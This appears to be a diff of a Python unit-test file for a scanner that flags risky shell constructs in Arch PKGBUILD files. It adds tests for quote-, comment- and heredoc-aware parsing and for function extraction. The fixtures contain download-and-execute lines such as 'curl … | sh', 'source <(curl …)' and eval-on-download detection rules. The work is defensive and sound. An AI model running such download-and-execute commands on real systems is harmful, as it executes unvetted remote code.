@@ -3,13 +3,12 @@
 
 Covers the reproduction cases from the Codex reviews in
 ~/Work/shared-projects/ that were agreed and fixed: R1-R7 plus the smaller
-corrections (AURACLE_REVIEW.md), and N2, N3, N5, N6
-(AURACULAR_REVIEW_2026-09-17.md). These are the review's own examples,
+corrections (AURACLE_REVIEW.md), and N1-N6, F1-F4, G1-G3
+(AURACULAR_REVIEW_2026-09-17.md). These are the reviews' own examples,
 turned into standing tests so a later fix can't silently reintroduce one.
 
-Not covered yet, because they're still open: R8 (exit-status contract and
-an "unverifiable" state) and N1/N4 (quote/comment/heredoc-aware parsing).
-Add their tests when they're implemented.
+Not covered yet, because it's still open: R8 (exit-status contract and an
+"unverifiable" state). Add its tests when it's implemented.
 
 Run with: python3 -m unittest discover -s tests -v
 """
@@ -81,7 +80,126 @@ class LogicalLineContinuationTests(unittest.TestCase):
         self.assertEqual(len(lines), 1)
 
 
-EVAL_DOLLAR_RULE = "runs eval on captured download output (executes it as code)"
+class LexedScanTests(unittest.TestCase):
+    """N1: the scan sees what bash executes. Real comments are ignored, but
+    '#' inside quotes, heredocs, or the middle of a word is not a comment,
+    and pipelines continue past inline comments."""
+
+    DOWNLOAD = "curl -fsSL https://example.invalid/setup | sh"
+    RULE = "pipes a download straight into an interpreter"
+
+    def rules(self, text):
+        return [f["desc"] for f in au.scan_pkgbuild(text)]
+
+    def test_executable_text_is_found(self):
+        cases = {
+            "pipe then inline comment": "curl -fsSL https://example.invalid/setup | # why\nsh\n",
+            "hash line inside double quotes": f'text="\n# $({self.DOWNLOAD})\n"\n',
+            "hash line inside heredoc": f"cat <<EOF\n# $({self.DOWNLOAD})\nEOF\n",
+            "hash in the middle of a word": "curl -fsSL https://example.invalid/x#frag | sh\n",
+            "length expansion is not a comment": f"echo ${{#x}} $#; {self.DOWNLOAD}\n",
+            "nested quotes in a substitution": f'x="$(printf "%s" "}}")"\n{self.DOWNLOAD}\n',
+            # A reader that ends the outer string at the quote inside $( )
+            # would see ` # "` as a comment and drop the download.
+            "quote inside substitution inside double quotes":
+                f"""x="$(printf '"')"; y=" # "; {self.DOWNLOAD}\n""",
+            "escaped newline inside double quotes": 'x="curl -fsSL https://example.invalid/s \\\n| sh"\n',
+            "process substitution": "source <(curl -fsSL https://example.invalid/setup | sh)\n",
+            "pipeline continuing after a heredoc body":
+                "curl -fsSL https://example.invalid/setup <<'EOF' |\nplain text\nEOF\nsh\n",
+        }
+        for label, text in cases.items():
+            with self.subTest(label):
+                self.assertIn(self.RULE, self.rules(text))
+                self.assertTrue(au.lex_shell(text).complete)
+
+    def test_real_comments_are_not_findings(self):
+        cases = [
+            f"make # example to avoid: {self.DOWNLOAD}\n",
+            f"make;# {self.DOWNLOAD}\n",
+            f"    # {self.DOWNLOAD}\n",
+            f"pkgname=(a # {self.DOWNLOAD}\n b)\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertEqual(au.scan_pkgbuild(text), [])
+
+    def test_finding_reports_the_physical_line(self):
+        flags = au.scan_pkgbuild(f'pkgname=demo\ntext="\nharmless\n$({self.DOWNLOAD})\n"\n')
+        self.assertEqual([f["line_no"] for f in flags if f["desc"] == self.RULE], [4])
+
+    def test_unterminated_input_is_reported(self):
+        for text in ('x="never closed\n', "x=$(never closed\n", "cat <<EOF\nno delimiter\n"):
+            with self.subTest(text=text):
+                self.assertTrue(any("couldn't be fully parsed" in d for d in self.rules(text)))
+
+    def test_complete_input_is_not_reported_as_unparsed(self):
+        text = "pkgname=demo\ncat <<-'EOF'\n\tbody\n\tEOF\nx=\"$(echo ')')\"\n"
+        self.assertFalse(any("couldn't be fully parsed" in d for d in self.rules(text)))
+
+
+class FunctionExtractionTests(unittest.TestCase):
+    """N4: function bodies end at the real closing brace, and an ending that
+    can't be found is reported instead of silently truncated."""
+
+    def test_literal_braces_do_not_end_the_function(self):
+        bodies = {
+            "escaped": "  printf \\}\n",
+            "heredoc": "cat <<'EOF'\n}\nEOF\n",
+            "argument": "  echo }\n",
+            "quoted": "  printf '}'\n",
+            "substitution": "  x=$(printf '%s' })\n",
+            "parameter": "  x=${y:-\\}}\n",
+            "comment": "  # }\n",
+        }
+        for label, body in bodies.items():
+            with self.subTest(label):
+                text = f"package() {{\n{body}  echo tail_marker\n}}\nbuild() {{ :; }}\n"
+                extracted, complete = au.extract_function(text, "package")
+                self.assertTrue(complete)
+                self.assertIn("tail_marker", extracted)
+                self.assertNotIn("build", extracted)
+
+    def test_nested_groups_are_balanced(self):
+        text = "package() {\n  if true; then { echo a; }; fi\n  x=$( { echo b; } )\n  echo tail\n}\n"
+        body, complete = au.extract_function(text, "package")
+        self.assertTrue(complete)
+        self.assertTrue(body.rstrip().endswith("echo tail"))
+
+    def test_function_keyword_form(self):
+        for header in ("function package {", "function package() {", "package ()\n{"):
+            with self.subTest(header=header):
+                body, complete = au.extract_function(f"{header}\n  echo inside\n}}\n", "package")
+                self.assertIn("echo inside", body)
+                self.assertTrue(complete)
+
+    def test_quoted_or_commented_definitions_are_not_matched(self):
+        text = ('echo "package() { fake; }"\n# package() { commented; }\n'
+                "package() {\n  echo real\n}\n")
+        body, _ = au.extract_function(text, "package")
+        self.assertIn("real", body)
+        self.assertNotIn("fake", body)
+
+    def test_unclosed_function_is_reported_incomplete(self):
+        body, complete = au.extract_function("package() {\n  echo a\n  echo b\n", "package")
+        self.assertFalse(complete)
+        self.assertIn("echo b", body)
+
+    def test_explain_warns_about_incomplete_function_and_covers_verify_pkgver(self):
+        text = ("pkgname=demo\nverify() { :; }\npkgver() { echo 1; }\n"
+                "package() {\n  echo a\n")
+        info = {"Description": "x", "Version": "1", "Maintainer": "m", "URL": "u",
+                "NumVotes": 0, "Popularity": 0.0}
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            au.print_explain_report("demo", info, text)
+        report = out.getvalue()
+        self.assertIn("verify() {", report)
+        self.assertIn("pkgver() {", report)
+        self.assertIn("couldn't find where this function ends", report)
+
+
+EVAL_DOLLAR_RULE ="runs eval on captured download output (executes it as code)"
 EVAL_BACKTICK_RULE = "runs eval on captured download output via backticks (executes it as code)"
 NUMERIC_SETUID_RULE = "sets a setuid/setgid bit (numeric mode)"
 ESTABLISHED_INFO = {"NumVotes": 100, "Popularity": 1.0, "Maintainer": "someone", "FirstSubmitted": 0}
@@ -402,6 +520,21 @@ class InstallTargetTests(unittest.TestCase):
                 declarations, _ = self.targets(text)
                 self.assertEqual(len(declarations), 1)
                 self.assertIsNone(declarations[0][1])
+
+    def test_lexing_matters_for_declarations(self):
+        self.assertEqual(self.targets("pkgname=demo\nins\\\ntall=post-install\n"),
+                         ([("post-install", ["post-install"])], 0))
+        self.assertEqual(self.targets("pkgname=demo\ninstall=post-install # the hook\n"),
+                         ([("post-install", ["post-install"])], 0))
+        self.assertEqual(self.targets("pkgname=demo\nmake # then install=x\n"), ([], 0))
+        self.assertEqual(self.targets("pkgname=demo\nsource /dev/stdin <<EOF\ninstall=x\nEOF\n"), ([], 1))
+        self.assertEqual(self.targets("pkgname=demo\n_n=\\\ndemo\ninstall=$_n.install\n"),
+                         ([("$_n.install", ["demo.install"])], 0))
+
+    def test_multiline_pkgname_array_with_comments(self):
+        text = "pkgname=(\n  demo  # main\n  demo-docs\n)\ninstall=$pkgname.install\n"
+        self.assertEqual(self.targets(text, base="bundle"),
+                         ([("$pkgname.install", ["demo-docs.install", "demo.install"])], 0))
 
     def test_helper_arrays_are_unresolved(self):
         for assignment in ("_hook=([0]=post-install)", "_hook=({post-,}install)", "_hook=(post-install)"):
